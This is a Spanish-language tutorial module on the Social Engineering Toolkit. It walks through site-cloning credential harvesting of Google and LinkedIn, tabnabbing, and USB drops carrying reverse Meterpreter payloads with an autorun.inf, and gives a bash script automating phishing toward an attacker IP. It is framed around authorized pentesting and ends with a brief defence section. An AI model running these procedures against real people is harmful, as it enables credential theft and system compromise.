# 🛠️ Social Engineering Toolkit (SET)

> *SET es una herramienta de código abierto diseñada para realizar ataques de ingeniería social. Es el framework más completo para simular ataques de phishing, credential harvester y USB drops.*

---

## 📋 Tabla de contenido

1. [Qué es SET](#1-qué-es-set)
2. [Instalación](#2-instalación)
3. [Modos de ataque](#3-modos-de-ataque)
4. [Credential Harvester](#4-credential-harvester)
5. [Website Attack Vectors](#5-website-attack-vectors)
6. [Infect with USB Drops](#6-infect-with-usb-drops)
7. [Ejemplo completo](#7-ejemplo-completo)
8. [Defensa y remediación](#8-defensa-y-remediación)
9. [Referencias](#9-referencias)

---

## 1. Qué es SET

Social Engineering Toolkit es una herramienta que automatiza ataques de ingeniería social para:
- **Phishing de credenciales** — clones de sitios web populares
- **Infección USB** — payloads maliciosos en dispositivos
- **Vectors de entrega** — email, web, USB

### Características

| Característica | Descripción |
|---|---|
| **Clonación de sitios** | Clonar cualquier sitio web en segundos |
| **Templates predefinidos** | Gmail, Facebook, LinkedIn, etc. |
| **Credential harvester** | Capturar usuarios y contraseñas |
| **USB drops** | Crear payloads para dispositivos USB |
| **Multi-plataforma** | Linux, macOS, Windows |

### Casos de uso legítimos

| Caso | Descripción |
|---|---|
| **Pentesting** | Evaluación de seguridad humana |
| **Concientización** | Entrenar empleados a detectar phishing |
| **Auditoría** | Evaluar efectividad de controles |
| **Investigación** | Estudiar comportamiento de usuarios |

---

## 2. Instalación

### En Kali Linux (pre-instalado)

```bash
# SET ya viene pre-instalado en Kali
setoolkit

# O ejecutar directamente
sudo setoolkit
```

### En otras distribuciones

```bash
# Clonar repositorio
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit

# Instalar dependencias
pip3 install -r requirements.txt

# Ejecutar
sudo python3 setoolkit
```

### Verificar instalación

```bash
# Ver versión
setoolkit --version

# Ver menú principal
sudo setoolkit
```

---

## 3. Modos de ataque

### Menú principal de SET

```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) DHCP Attacks
7) QRCode Generator Attack
8) Powershell Attack Vectors
9) Third Party Modules
0) Exit
```

### Resumen de vectores

| Vector | Uso | Riesgo |
|---|---|---|
| **Social-Engineering Attacks** | Phishing, vishing, USB drops | Medio |
| **Website Attack Vectors** | Clonación de sitios, credential harvesting | Alto |
| **Infectious Media Generator** | USB con payload | Alto |
| **Create a Payload and Listener** | Crear y escuchar reverse shells | Crítico |
| **Mass Mailer Attack** | Envío masivo de phishing | Medio |

---

## 4. Credential Harvester

El credential harvester clona sitios web y captura credenciales.

### Configurar

```bash
# 1. Iniciar SET
sudo setoolkit

# 2. Seleccionar: Social-Engineering Attacks → Website Attack Vectors → Credential Harvester
# 3. Seleccionar: Site Cloner

# 4. Introducir tu IP (para recibir las credenciales)
# IP for the POST back in Harvester/Tabnabbing: 10.10.14.5

# 5. Seleccionar template
# 1. Java Required
# 2. Google
# 3. Twitter
# 4. Custom import

# 6. Introducir URL a clonar
# Enter the url to clone: https://mail.google.com
```

### Resultado

```bash
[*] Credential Harvester is now listening on port 80...
[*] Server started on port 80
[*] Credentials will be posted to the POST form

# Cuando alguien visita tu IP y envía credenciales:
[*] WE HAVE A CREDENTIAL HIT!
[*] Credential: usuario@gmail.com:contraseña123
```

---

## 5. Website Attack Vectors

### Tipos de ataque web

| Ataque | Descripción |
|---|---|
| **Java Applet Attack** | Inyectar applet malicioso |
| **Credential Harvester** | Capturar credenciales |
| **Tabnabbing** | Cambiar pestaña del navegador |
| **Web Jacking** | Suplantación de sitio web |
| **Multi-Attack** | Combinar múltiples vectores |

### Tabnabbing

```bash
# Cambia la pestaña del navegador cuando el usuario cambia de pestaña
# El usuario cree que su sesión expiró y vuelve a hacer login

# Configurar
1) Website Attack Vectors → 3) Tabnabbing
# Seleccionar template y URL
```

### Web Jacking

```bash
# Crea un popup que parece legítimo
# El usuario cree que es una actualización legítima

# Configurar
1) Website Attack Vectors → 4) Web Jacking
```

---

## 6. Infect with USB Drops

Crear USBs con payloads maliciosos para distribución física.

### Crear USB infectado

```bash
# 1. Iniciar SET
sudo setoolkit

# 2. Seleccionar: Infectious Media Generator
# 3. Seleccionar: File-Format Exploits
# 4. Seleccionar exploit
#   1) Adobe PDF Embedded EXE (CVE-2010-1240)
#   2) Microsoft Office HTA
#   3) Microsoft Windows DLL Hijacking

# 5. Seleccionar payload
#   1) Windows Reverse TCP Meterpreter
#   2) Windows Reverse HTTP Meterpreter
#   3) Windows Reverse DNS Meterpreter

# 6. Configurar IP y puerto
# LHOST: 10.10.14.5
# LPORT: 4444

# 7. El archivo se genera en /root/.set/
```

### Distribución

```bash
# Copiar a USB
cp /root/.set/payload.exe /media/usb/

# Crear launcher automático
cat > /media/usb/autorun.inf << 'EOF'
[autorun]
open=payload.exe
shell\open=Open
shell\open\command=payload.exe
shell\open\label=Open
EOF
```

---

## 7. Ejemplo completo

### Escenario: Phishing de LinkedIn para pentest autorizado

```bash
# 1. Iniciar SET
sudo setoolkit

# 2. Seleccionar vector de ataque
set> 1  # Social-Engineering Attacks

# 3. Seleccionar Website Attack Vector
set:webattack> 2  # Website Attack Vectors

# 4. Seleccionar Credential Harvester
set:webattack> 3  # Credential Harvester Method

# 5. Seleccionar Site Cloner
set:webattack> 1  # Site Cloner

# 6. Introducir IP para recibir credenciales
set:webattack> 10.10.14.5

# 7. Seleccionar template
set:webattack> 2  # Google (parece más legítimo)

# 8. URL a clonar
set:webattack> https://www.linkedin.com

# 9. Esperar a que SET inicie el servidor
[*] Credential Harvester is now listening on port 80...
[*] Server started on port 80

# 10. Enviar email a la víctima con link a http://10.10.14.5
# Cuando visiten el sitio y envíen credenciales:
[*] WE HAVE A CREDENTIAL HIT!
[*] LinkedIn Credentials: usuario@email.com:contraseña123

# 11. Ctrl+C para detener
```

### Script automatizado

```bash
#!/bin/bash
# Script para automatizar phishing con SET

# Configuración
ATTACKER_IP="10.10.14.5"
TARGET_URL="https://www.linkedin.com"
PORT=80

# Iniciar SET con parámetros
echo "[*] Iniciando credential harvester..."
echo "[*] URL a clonar: $TARGET_URL"
echo "[*] IP del atacante: $ATTACKER_IP"
echo "[*] Puerto: $PORT"

# Ejecutar SET
sudo setoolkit << EOF
1
2
3
1
$ATTACKER_IP
2
$TARGET_URL
EOF
```

---

## 8. Defensa y remediación

### Para Blue Team / Equipo de Seguridad

| Vector | Detección | Mitigación |
|---|---|---|
| **Clonación de sitios** | Verificar URLs, certificados | MFA, password managers |
| **Credential harvester** | Analizar headers de email | DMARC, DKIM, SPF |
| **USB drops** | Políticas de USB | Deshabilitar autorun, EDR |
| **Phishing emails** | Filtros de spam | Entrenamiento, reporte |

### Configurar detección

```bash
# Monitorear tráfico sospechoso
tcpdump -i eth0 port 80 | grep -i "POST"

# Detectar clonación de sitios
# Verificar si alguien está clonando tu sitio
# Usar herramientas como PhishTank
```

### Entrenamiento

| Actividad | Frecuencia | Responsable |
|---|---|---|
| Campañas de phishing | Mensual | Equipo de Seguridad |
| Análisis de resultados | Post-campaña | Management |
| Entrenamiento interactivo | Trimestral | RRHH + Seguridad |

---

## 9. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **SET GitHub** | [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit) |
| **SET Documentation** | [https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/) |
| **MITRE ATT&CK — Phishing** | [https://attack.mitre.org/techniques/T1566/](https://attack.mitre.org/techniques/T1566/) |
| **Kali Linux Tools** | [https://www.kali.org/tools/set/](https://www.kali.org/tools/set/) |

### Alternativas a SET

| Herramienta | Uso |
|---|---|
| **GoPhish** | Campañas de phishing más controladas |
| **King Phisher** | Phishing con análisis de resultados |
| **Evilginx2** | Bypass de MFA (advanced) |
| **Gophish** | Phishing empresarial |

---

**[⬅ GoPhish](./01-gophish.md)** · **[⬅ Volver al módulo](../README.md)** · **[→ Otras herramientas](./03-herramientas-fishing.md)**
